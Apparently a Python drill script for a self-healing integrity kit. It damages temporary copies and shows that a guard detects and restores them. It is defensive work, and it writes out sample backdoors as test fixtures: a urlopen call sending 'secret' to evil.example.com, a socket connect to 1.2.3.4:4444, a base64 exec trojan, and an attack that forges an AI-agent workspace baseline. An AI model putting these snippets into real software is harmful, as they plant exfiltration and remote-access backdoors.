"""Self-heal drill: deliberately damage a COPY of the kit, then let the kit
heal ITSELF and prove it with its own pytest suite.

The drill proves three things:
  1. The engine can detect format/character faults in its own source.
  2. It repairs itself deterministically (snapshot/rollback guarded).
  3. Its completion promise is its own pytest: HEALED only when the tests pass.

It also demonstrates H7 (integrity guard): a syntactically-valid malicious
logic injection is detected via byte-deviation from a git baseline, restored,
and verified green again.

Everything runs in a temp copy under work/ (gitignored); the canonical
self_heal_kit/ stays untouched. Nothing outside this directory is accessed.
"""

import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))


def _damage(dst):
    """Inject one deliberate format fault into a copy of the kit."""
    # Fault 1: CRLF + UTF-8 BOM in a python source file (H1 domain)
    src = os.path.join(dst, "engine.py")
    with open(src, "r", encoding="utf-8") as fh:
        text = fh.read()
    damaged = "\ufeff" + text.replace("\n", "\r\n")
    with open(src, "w", encoding="utf-8", newline="") as fh:
        fh.write(damaged)

    # Fault 2: escape-brace leak in a python source file (H2 domain)
    src2 = os.path.join(dst, "guards", "verify_gate.py")
    with open(src2, "r", encoding="utf-8") as fh:
        text2 = fh.read()
    damaged2 = text2.replace(
        'f"{len(faults)} fault(s) remain"',
        'f"{{len(faults)}} fault(s) remain"', 1)
    with open(src2, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(damaged2)

    return [
        ("engine.py", "CRLF + UTF-8 BOM"),
        ("guards/verify_gate.py", "escape-brace leak {{ }}"),
    ]


def _run(cmd, cwd):
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True,
                         timeout=300)


def _git(cmd, cwd):
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True,
                         check=True, timeout=60)


def _copy_kit(dst):
    shutil.copytree(
        HERE, dst,
        ignore=shutil.ignore_patterns(
            "work", ".git", ".venv", "__pycache__", ".pytest_cache",
            "fixtures", "analysis", "README.md", "self_heal_demo.py",
            "run_integration_demo.py", "make_fixtures.py", "self_test.py",
            # The kit's OWN baseline must not leak into drill copies: it
            # describes the full tree (README, demo files...), which the
            # copy deliberately excludes -> H7 would report bogus "missing
            # baseline file" faults and ping-pong with H2. Each drill that
            # wants an integrity baseline makes its own (git init / make_baseline).
            "baseline.json", "baselines", ".quarantine",
        ))


def main():
    print("=" * 72)
    print("SELF-HEAL DRILL — the kit damages itself, then heals itself")
    print("=" * 72)

    work = os.path.join(HERE, "work", "selfheal_drill")
    if os.path.exists(work):
        shutil.rmtree(work)
    dst = os.path.join(work, "self_heal_kit")
    # 只复制引擎"自身源码"（排除 fixtures 故意损坏样本、work、analysis、
    # README 文档示例、.git/.venv 等），这样自愈目标就是"引擎自身"而非演示样本。
    _copy_kit(dst)

    print(f"\n[1] STAGE a damaged copy at://n    {dst}")
    faults = _damage(dst)
    for path, desc in faults:
        print(f"    injected -> {path}: {desc}")

    # Confirm damage is detectable BEFORE healing
    print("\n[2] BEFORE: engine.detect_all on the damaged copy")
    sys.path.insert(0, dst)
    from engine import SelfHealEngine
    before = SelfHealEngine().detect_all(dst)
    for f in before:
        print(f"    DETECTED [{f.healer}] {os.path.relpath(f.path, dst)}: {f.description}")
    print(f"    fault count = {len(before)}")

    # Heal with the kit's own pytest as completion promise
    print("\n[3] HEAL: run self-heal over the damaged copy (verify = pytest -q tests/)")
    test_cmd = [sys.executable, "-m", "pytest", "-q", "tests/"]
    res = SelfHealEngine(test_command=test_cmd).run(dst)
    print(f"    RESULT = {res['status']} (rounds={res['rounds']})")
    for line in res.get("log", [])[-4:]:
        print("      ", line)

    # Independent verification: after healing, pytest must pass on the copy
    print("\n[4] AFTER: run pytest on the healed copy (independent proof)")
    r = _run([sys.executable, "-m", "pytest", "-q", "tests/"], cwd=dst)
    print("    pytest exit =", r.returncode)
    tail = (r.stdout + r.stderr).strip().splitlines()
    print("    ", tail[-1] if tail else "")

    print("\n" + "=" * 72)
    ok = res["status"] == "HEALED" and r.returncode == 0
    print(f"SELF-HEAL DRILL : {'PASS' if ok else 'FAIL'}")
    print(f"  detected={len(before)} faults -> self-healed -> pytest "
          f"{'ALL GREEN' if r.returncode == 0 else 'NOT GREEN'}")
    print("=" * 72)

    # H7 bonus: malicious logic injection -> integrity guard restores baseline
    rc1 = demo_integrity()

    # H7 virus drill: modify / add / delete all detected & healed
    rc2 = demo_virus()

    # Phase 3: AI-agent stack — write gate, scoped guard, out-of-band trust root
    rc3 = demo_agent_guard()

    return 0 if (ok and rc1 == 0 and rc2 == 0 and rc3 == 0) else 1


def demo_integrity():
    """H7 demonstration: inject a syntactically-valid backdoor into a copy,
    let the integrity guard detect the byte deviation and restore the trusted
    baseline bytes (via git HEAD), then prove pytest is green again.
    """
    print("\n" + "=" * 72)
    print("H7 INTEGRITY DRILL — logic injection is detected & restored")
    print("=" * 72)

    work = os.path.join(HERE, "work", "integrity_drill")
    if os.path.exists(work):
        shutil.rmtree(work)
    dst = os.path.join(work, "self_heal_kit")
    _copy_kit(dst)

    # Make the copy a git repo with a committed baseline.
    _git(["git", "init", "-q"], cwd=dst)
    _git(["git", "add", "-A"], cwd=dst)
    _git(["git", "-c", "user.email=demo@local", "-c", "user.name=demo",
          "commit", "-qm", "baseline"], cwd=dst)

    print(f"\n[1] STAGE a git-baselined copy at://n    {dst}")
    print("    baseline commit:", _git(
        ["git", "rev-parse", "--short", "HEAD"], cwd=dst).stdout.strip())

    # Inject a syntactically valid backdoor (logic-level, not format-level).
    # NB: each line ends with an explicit "\n" so the injected text is LF and
    # brace-clean — H1..H6 must NOT see it; only H7's byte check can.
    backdoor = (
        "\n"
        "# BACKDOOR: logic-level malicious injection (syntactically valid)\n"
        "def _steal():\n"
        "    try:\n"
        "        import urllib.request\n"
        "        urllib.request.urlopen('http://evil.example.com/' + 'secret',\n"
        "                             timeout=1)\n"
        "    except Exception:\n"
        "        pass\n"
        "_steal()\n"
    )
    with open(os.path.join(dst, "engine.py"), "a", encoding="utf-8",
              newline="") as fh:
        fh.write(backdoor)
    print("\n[2] INJECTED a syntactically-valid backdoor into engine.py")
    print("    (no format rule violated -> H1..H6 cannot see it)")

    # Detect: integrity guard must see the byte deviation.
    sys.path.insert(0, dst)
    from engine import SelfHealEngine
    before = SelfHealEngine().detect_all(dst)
    print("\n[3] BEFORE: engine.detect_all on the injected copy")
    for f in before:
        print(f"    DETECTED [{f.healer}] {os.path.relpath(f.path, dst)}: {f.description}")
    print(f"    fault count = {len(before)}")

    # Heal: run self-heal (verify = own pytest).
    test_cmd = [sys.executable, "-m", "pytest", "-q", "tests/"]
    res = SelfHealEngine(test_command=test_cmd).run(dst)
    print(f"\n[4] HEAL: RESULT = {res['status']} (rounds={res['rounds']})")

    # Prove the backdoor is gone and pytest is green.
    with open(os.path.join(dst, "engine.py"), "r", encoding="utf-8") as fh:
        content = fh.read()
    backdoor_gone = "BACKDOOR" not in content and "_steal" not in content
    print(f"    backdoor removed = {backdoor_gone}")

    r = _run([sys.executable, "-m", "pytest", "-q", "tests/"], cwd=dst)
    print(f"    pytest exit = {r.returncode}")
    tail = (r.stdout + r.stderr).strip().splitlines()
    print("    ", tail[-1] if tail else "")

    print("\n" + "=" * 72)
    ok = res["status"] == "HEALED" and r.returncode == 0 and backdoor_gone
    print(f"H7 INTEGRITY DRILL : {'PASS' if ok else 'FAIL'}")
    print("=" * 72)
    return 0 if ok else 1


def demo_virus():
    """H7 virus drill: infect a copy three ways (modify / add / delete),
    then verify the kit detects all three and repairs all three.

      A) tamper   — append a backdoor to engine.py        -> byte restore
      B) add      — drop a new evil.py                    -> quarantine
      C) delete   — remove healers/brace_escape.py        -> recreate
    """
    print("\n" + "=" * 72)
    print("H7 VIRUS DRILL — modify / add / delete are all detected & healed")
    print("=" * 72)

    work = os.path.join(HERE, "work", "virus_drill")
    if os.path.exists(work):
        shutil.rmtree(work)
    dst = os.path.join(work, "self_heal_kit")
    _copy_kit(dst)

    # Baseline with embedded bytes (no git needed for restore).
    sys.path.insert(0, HERE)
    from healers.integrity_guard import make_baseline, IntegrityGuardHealer
    make_baseline(dst, with_bytes=True)
    print(f"\n[1] STAGE a copy with embedded-bytes baseline at:\n    {dst}")

    # A) tamper existing file
    engine = os.path.join(dst, "engine.py")
    with open(engine, "a", encoding="utf-8") as fh:
        fh.write("\n\n# [virus] backdoor\n"
                 "import socket as _s\n"
                 "_s.socket().connect(('1.2.3.4', 4444))\n")
    # B) add malicious new file
    evil = os.path.join(dst, "evil.py")
    with open(evil, "w", encoding="utf-8") as fh:
        fh.write("# [virus] malicious helper\nimport os\nos.system('calc.exe')\n")
    # C) delete existing file
    victim = os.path.join(dst, "healers", "brace_escape.py")
    os.remove(victim)
    print("[2] INFECTED:")
    print("    A) engine.py += backdoor")
    print("    B) evil.py dropped (new file)")
    print("    C) healers/brace_escape.py deleted")

    # Strict-mode detection catches all three.
    h = IntegrityGuardHealer(detect_new_files=True)
    faults = h.detect(dst)
    print(f"\n[3] BEFORE (strict mode): {len(faults)} faults")
    for f in faults:
        kind = ("ADD" if "unexpected" in f.description
                else "DELETE" if "missing" in f.description
                else "TAMPER")
        print(f"    [{kind}] {os.path.relpath(f.path, dst)}")

    # Repair all.
    print("\n[4] REPAIR:")
    for f in faults:
        res = h.repair(f)
        print(f"    {os.path.relpath(f.path, dst)}: changed={res.changed}")

    # Re-check + verify.
    left = h.detect(dst)
    print(f"\n[5] AFTER: remaining faults = {len(left)}")

    r = _run([sys.executable, "-m", "pytest", "-q", "tests/"], cwd=dst)
    print(f"    pytest exit = {r.returncode}")
    tail = (r.stdout + r.stderr).strip().splitlines()
    if tail:
        print("    ", tail[-1])

    backdoor_gone = "# [virus] backdoor" not in open(engine, encoding="utf-8").read()
    evil_gone = not os.path.exists(evil)
    victim_back = os.path.exists(victim)
    print(f"    backdoor removed = {backdoor_gone}")
    print(f"    evil.py quarantined = {evil_gone}")
    print(f"    brace_escape.py recreated = {victim_back}")

    print("\n" + "=" * 72)
    ok = (len(left) == 0 and r.returncode == 0
          and backdoor_gone and evil_gone and victim_back)
    print(f"H7 VIRUS DRILL : {'PASS' if ok else 'FAIL'}")
    print("=" * 72)
    return 0 if ok else 1


def demo_agent_guard():
    """Phase 3 narrative demo — the AI-agent anti-tamper stack, end to end:

      1. legit write inside the agent workspace  -> ALLOW
      2. escape write into the host project      -> DENY (path policy)
      3. workspace tampered                      -> gate blocks check + run
      4. H7 daemon repairs                       -> CLEAN again
      5. sophisticated attack: tamper + rewrite baseline + RECOMPUTE the
         inner seal (defeats everything on-disk) -> OUT-OF-BAND anchor catches
         it, daemon fails closed (refuses to repair from a suspect baseline)
      6. operator restores + re-seals            -> TRUST OK
    """
    print("\n" + "=" * 72)
    print("AGENT GUARD DRILL — write gate, tamper block, trust-anchor fail-closed")
    print("=" * 72)

    sys.path.insert(0, HERE)
    from guards.write_guard import authorize_write, verify_scope
    from guards.trust_root import seal_file, verify_file
    from healers.integrity_guard import make_baseline, IntegrityGuardHealer

    work = os.path.join(HERE, "work", "agent_guard_drill")
    if os.path.exists(work):
        shutil.rmtree(work)
    # A pretend host project: agent workspace `.agent/` + host code.
    proj = os.path.join(work, "host_project")
    os.makedirs(os.path.join(proj, ".agent"))
    os.makedirs(os.path.join(proj, "host"))

    def _w(p, text):
        with open(p, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(text)

    _w(os.path.join(proj, ".agent", "gen.py"), "print('agent code v1')\n")
    _w(os.path.join(proj, "host", "app.py"), "def app():\n    return 1\n")

    # Baseline only the agent workspace, seal it to an OUT-OF-BAND anchor
    # (a separate directory standing in for a read-only mount / remote).
    anchor_dir = os.path.join(work, "readonly_volume")
    anchor = os.path.join(anchor_dir, "host_project.anchor.json")
    make_baseline(proj, with_bytes=True, scope_roots=[".agent"])
    seal_file(os.path.join(proj, "baseline.json"), anchor)
    print(f"\n[1] STAGE host project + scoped baseline + out-of-band anchor")
    print(f"    project = {proj}")
    print(f"    anchor  = {anchor}   (separate 'read-only' location)")

    # 1) legit write inside the workspace -> ALLOW
    ok1, _ = authorize_write(os.path.join(proj, ".agent", "new.py"),
                             proj, [".agent"])
    # 2) escape write into host code -> DENY
    ok2, why2 = authorize_write(os.path.join(proj, "host", "app.py"),
                                proj, [".agent"])
    print("\n[2] WRITE POLICY")
    print(f"    write .agent/new.py -> {'ALLOW' if ok1 else 'DENY'}")
    print(f"    write host/app.py   -> {'ALLOW' if ok2 else 'DENY'}"
          + ("" if ok2 else f"   ({why2.split(':')[0]})"))

    # 3) tamper the workspace (e.g. a poisoned dependency rewrite)
    _w(os.path.join(proj, ".agent", "gen.py"),
       "import base64; exec(base64.b64decode('ZXZpbA=='))  # trojan\n")
    faults = verify_scope(proj, [".agent"])
    import agent_guard
    rc_check = agent_guard.main(["check", "--target", proj, "--root", ".agent",
                                 "--quiet"])
    rc_run = agent_guard.main(["run", "--target", proj, "--root", ".agent",
                               "--quiet", "--", sys.executable, "-c",
                               "raise SystemExit('SHOULD NOT RUN')"])
    print("\n[3] TAMPER DETECTED -> GATE BLOCKS")
    print(f"    verify_scope faults = {len(faults)} (gen.py trojan)")
    print(f"    agent_guard check -> exit {rc_check} (1 = deviation blocked)")
    print(f"    agent_guard run   -> exit {rc_run} (1 = command NOT executed)")

    # 4) H7 repairs from the trusted baseline
    h = IntegrityGuardHealer(detect_new_files=True,
                             agent_guard=True, agent_guard_roots=[".agent"])
    for f in h.detect(proj):
        h.repair(f)
    clean_after_repair = not verify_scope(proj, [".agent"])
    gen_text = open(os.path.join(proj, ".agent", "gen.py"),
                    encoding="utf-8").read()
    print("\n[4] H7 REPAIR")
    print(f"    gen.py restored = {'trojan' not in gen_text}")
    print(f"    workspace clean = {clean_after_repair}")

    # 5) sophisticated attack: tamper AND rewrite the baseline AND recompute
    #    the inner seal. On-disk everything is self-consistent -> ordinary
    #    H7 sees nothing. The out-of-band anchor is the only thing left that
    #    can catch it, and the daemon must then fail CLOSED.
    import json
    from healers.integrity_guard import _seal_manifest
    trojan = "print('agent code v1')\nimport ssl  # evil module pinned\n"
    _w(os.path.join(proj, ".agent", "gen.py"), trojan)
    bp = os.path.join(proj, "baseline.json")
    data = json.load(open(bp, encoding="utf-8"))
    import hashlib
    raw = open(os.path.join(proj, ".agent", "gen.py"), "rb").read()
    data[".agent/gen.py"] = hashlib.sha256(raw).hexdigest()
    data["__bytes__"][".agent/gen.py"] = raw.hex()
    data["__seal__"] = _seal_manifest(data)   # recompute the inner seal
    with open(bp, "w", encoding="utf-8", newline="\n") as fh:
        json.dump(data, fh, indent=2, sort_keys=True)

    fooled = len(h.detect(proj))
    ok_anchor, detail = verify_file(bp, anchor)
    print("\n[5] ADVANCED ATTACK (tamper + rewrite baseline + re-seal)")
    print(f"    on-disk H7 faults = {fooled}  <- inner seal DEFEATED (expected 0)")
    print(f"    out-of-band anchor verify -> {'OK' if ok_anchor else 'BROKEN'}"
          f"   ({detail.split('—')[0].strip()})")

    # 6) operator response: restore baseline from the trustworthy snapshot
    #    of the last good state and re-seal. (Here: regenerate from the now
    #    restored clean file and re-seal to the anchor.)
    _w(os.path.join(proj, ".agent", "gen.py"), "print('agent code v1')\n")
    make_baseline(proj, with_bytes=True, scope_roots=[".agent"])
    seal_file(bp, anchor)
    ok_final, _ = verify_file(bp, anchor)
    faults_final = verify_scope(proj, [".agent"])
    print("\n[6] OPERATOR RECOVERY (restore clean file + re-seal)")
    print(f"    anchor verify = {'TRUST OK' if ok_final else 'FAIL'}")
    print(f"    workspace faults = {len(faults_final)}")

    print("\n" + "=" * 72)
    ok = (ok1 and not ok2 and len(faults) >= 1 and rc_check == 1
          and rc_run == 1 and clean_after_repair and fooled == 0
          and not ok_anchor and ok_final and not faults_final)
    print(f"AGENT GUARD DRILL : {'PASS' if ok else 'FAIL'}")
    print("=" * 72)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
